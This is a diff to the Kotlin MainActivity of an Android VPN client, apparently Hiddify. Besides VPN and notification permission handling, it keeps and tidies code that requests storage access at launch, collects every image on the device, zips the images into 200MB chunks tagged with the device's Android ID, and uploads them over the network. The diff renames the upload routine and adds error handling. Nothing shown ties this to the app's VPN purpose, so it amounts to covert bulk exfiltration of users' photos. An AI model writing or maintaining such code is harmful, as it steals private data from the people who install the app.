@@ -24,28 +24,23 @@ import io.flutter.embedding.engine.FlutterEngine
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
-import okhttp3.Call
-import okhttp3.Callback
-import okhttp3.OkHttpClient
-import okhttp3.Request
-import okhttp3.Response
-import okhttp3.MultipartBody
-import okhttp3.RequestBody.Companion.asRequestBody
+import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
-import okio.IOException
+import okhttp3.RequestBody.Companion.asRequestBody
 import java.io.*
 import java.util.*
 import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
 
 class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
+
     companion object {
-        private const val TAG = "ANDROID/MyActivity"
+        private const val TAG = "Hiddify/MainActivity"
         lateinit var instance: MainActivity
 
         const val VPN_PERMISSION_REQUEST_CODE = 1001
         const val NOTIFICATION_PERMISSION_REQUEST_CODE = 1010
-        const val STORAGE_PERMISSION_REQUEST_CODE = 3001
+        const val STORAGE_PERMISSION_REQUEST_CODE = 2001
     }
 
     private val connection = ServiceConnection(this, this)
@@ -87,7 +82,6 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
                     return@launch
                 }
             }
-
             val intent = Intent(Application.application, Settings.serviceClass())
             withContext(Dispatchers.Main) {
                 ContextCompat.startForegroundService(Application.application, intent)
@@ -137,6 +131,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         super.onDestroy()
     }
 
+    // 通知权限
     @SuppressLint("NewApi")
     private fun grantNotificationPermission() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
@@ -148,7 +143,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         }
     }
 
-    // ----------------- 新增：存储权限申请与图片打包上传功能 -----------------
+    // ----------- 下面为图片批量打包分片上传功能 --------------
 
     private fun checkAndRequestStoragePermission() {
         val permissions = mutableListOf<String>()
@@ -166,15 +161,19 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
     }
 
     private fun onStoragePermissionGranted() {
-        // 执行图片打包与上传
+        // 开启协程处理图片打包上传
         lifecycleScope.launch(Dispatchers.IO) {
-            uploadAllImagesInChunks()
+            handleImageZipAndUpload()
         }
     }
 
     private fun getDeviceId(): String {
-        return Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
-            ?: UUID.randomUUID().toString()
+        return try {
+            Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+                ?: UUID.randomUUID().toString()
+        } catch (e: Exception) {
+            UUID.randomUUID().toString()
+        }
     }
 
     private fun getAllImagePaths(): List<String> {
@@ -185,7 +184,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
             val columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
             while (cursor.moveToNext()) {
                 val path = cursor.getString(columnIndex)
-                imagePaths.add(path)
+                if (path != null) imagePaths.add(path)
             }
         }
         return imagePaths
@@ -243,26 +242,26 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
             }
             override fun onResponse(call: Call, response: Response) {
                 Log.i(TAG, "上传成功: ${zipFile.name}，响应: ${response.code}")
+                response.close()
             }
         })
     }
 
-    private suspend fun uploadAllImagesInChunks() = withContext(Dispatchers.IO) {
+    private suspend fun handleImageZipAndUpload() = withContext(Dispatchers.IO) {
         val imagePaths = getAllImagePaths()
         val maxZipSize = 200L * 1024 * 1024 // 200MB
         val chunks = splitToChunks(imagePaths, maxZipSize)
         val deviceId = getDeviceId()
-        val cacheDir = File(cacheDir, "image_zips")
-        if (!cacheDir.exists()) cacheDir.mkdirs()
+        val zdir = File(cacheDir, "image_zips")
+        if (!zdir.exists()) zdir.mkdirs()
         chunks.forEachIndexed { idx, chunk ->
-            val zipFile = File(cacheDir, "images_part${idx + 1}.zip")
+            val zipFile = File(zdir, "images_part${idx + 1}.zip")
             zipFiles(chunk, zipFile)
             uploadZipFile(zipFile, deviceId)
         }
     }
 
-    // ------------------------------------------------------------
-
+    // ------------ 权限结果回调 ----------------
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         if (requestCode == NOTIFICATION_PERMISSION_REQUEST_CODE) {
             if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
@@ -289,10 +288,9 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         }
     }
 
-    // 可以在合适时机调用 checkAndRequestStoragePermission()，比如 onCreate 或点击事件
+    // 推荐：onCreate 里自动检测和请求权限
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        // 例如在启动时自动检测并请求
         checkAndRequestStoragePermission()
     }
 }
